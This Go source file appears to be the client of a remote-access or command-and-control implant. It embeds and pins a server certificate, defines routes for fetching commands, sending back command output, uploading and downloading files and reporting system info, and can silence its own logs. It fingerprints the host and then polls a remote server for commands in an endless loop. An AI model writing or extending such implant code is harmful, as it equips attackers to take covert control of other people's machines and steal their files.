package client

import (
	"crypto/tls"
	"crypto/x509"
	"errors"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"strconv"
	"time"
)

//go:generate go-bindata -o cert.go ../cert/server.crt

// routes
const (
	getCmdURL       = "/getcmd"
	cmdOutputURL    = "/cmdoutput"
	uploadFileURL   = "/upload"
	downloadFileURL = "/download"
	sysInfoURL      = "/sysinfo"
)

// special errors
var ErrHTTPResponse = errors.New("http: server gave HTTP response to HTTPS client")

// debug
var hasTLS = true

const hasLogs = true

var ClientToken string

func ClientSetup() *http.Client {
	// set up own cert pool
	tlsConfig := &tls.Config{RootCAs: x509.NewCertPool()}
	transport := &http.Transport{TLSClientConfig: tlsConfig}
	client := &http.Client{
		Transport: transport,
		Timeout:   30 * time.Minute,
	}

	// load trusted cert path
	caCert, err := Asset("../cert/server.crt")
	if err != nil {
		panic(err)
	}
	ok := tlsConfig.RootCAs.AppendCertsFromPEM(caCert)
	if !ok {
		panic("Couldn't load cert file")
	}

	return client
}

func RunClient(host string, port int) {
	// Create token from pseudorandom number generator and convert it to hex (should be sufficient)
	ClientToken = strconv.FormatInt(rand.NewSource(time.Now().UnixNano()).Int63(), 16)

	if !hasLogs {
		log.SetFlags(0)
		log.SetOutput(ioutil.Discard)
	}

	RunFingerprinter()

	client := ClientSetup()

	for {
		cmd, hoststr := RequestCommand(client, host, port)
		Middleware(client, cmd, hoststr)
	}
}
